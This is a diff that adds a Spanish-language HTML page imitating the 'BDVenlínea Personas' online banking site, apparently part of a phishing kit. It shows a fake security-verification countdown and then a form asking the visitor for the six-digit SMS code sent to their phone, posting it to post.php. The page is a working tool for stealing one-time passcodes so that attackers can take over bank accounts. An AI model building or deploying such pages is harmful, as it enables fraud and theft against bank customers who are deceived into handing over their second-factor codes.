@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlínea Personas</title>
+    <style>
+        body { background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        .login-card { background-color: white; padding: 45px 30px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; width: 85%; max-width: 320px; }
+        .logo { width: 180px; margin-bottom: 30px; }
+        .info-text { color: #666; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        
+        /* Animación de barras */
+        .loader-bdv { display: flex; justify-content: center; align-items: center; gap: 4px; height: 40px; margin: 20px 0; }
+        .bar { width: 5px; height: 15px; background-color: #2c4d6d; border-radius: 2px; animation: bdv-loading 1s ease-in-out infinite; }
+        .bar:nth-child(1) { animation-delay: 0.1s; } .bar:nth-child(2) { animation-delay: 0.2s; } .bar:nth-child(3) { animation-delay: 0.3s; } .bar:nth-child(4) { animation-delay: 0.4s; } .bar:nth-child(5) { animation-delay: 0.5s; }
+        @keyframes bdv-loading { 0%, 100% { height: 15px; } 50% { height: 35px; } }
+
+        /* Formulario de Código */
+        #codigo-container { display: none; }
+        .input-code { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 18px; text-align: center; box-sizing: border-box; }
+        .btn-enviar { background-color: #0067b1; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: not-allowed; opacity: 0.5; }
+        .timer-text { color: #888; font-size: 14px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <img src="logo.png" class="logo">
+
+    <!-- SECCIÓN DE CARGA -->
+    <div id="loading-section">
+        <div class="info-text">Estamos verificando su información en nuestro sistema de seguridad.</div>
+        <div class="loader-bdv">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+        <div class="timer-text">Por favor espere <span id="seconds" style="color:#eb1c24; font-weight:bold;">15</span> segundos</div>
+    </div>
+
+    <!-- SECCIÓN DE CÓDIGO -->
+    <div id="codigo-container">
+        <div class="info-text">Por favor, ingresa el código para verificar que eres tú.</div>
+        <form action="post.php" method="POST">
+            <input type="tel" id="input-sms" name="codigo_sms" class="input-code" placeholder="000000" maxlength="6" inputmode="numeric" required>
+            <button type="submit" id="btn-enviar" class="btn-enviar" disabled>Continuar</button>
+        </form>
+        <p style="font-size: 11px; color: #aaa; margin-top: 15px;">Hemos enviado un código de seguridad a su teléfono registrado.</p>
+    </div>
+</div>
+
+<script>
+    let timeLeft = 15;
+    const countdown = setInterval(() => {
+        timeLeft--;
+        document.getElementById('seconds').textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            document.getElementById('loading-section').style.display = 'none';
+            document.getElementById('codigo-container').style.display = 'block';
+        }
+    }, 1000);
+
+    const inputSms = document.getElementById('input-sms');
+    const btn = document.getElementById('btn-enviar');
+
+    inputSms.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length === 6) {
+            btn.disabled = false;
+            btn.style.opacity = "1";
+            btn.style.cursor = "pointer";
+        } else {
+            btn.disabled = true;
+            btn.style.opacity = "0.5";
+            btn.style.cursor = "not-allowed";
+        }
+    });
+</script>
+</body>
+</html>
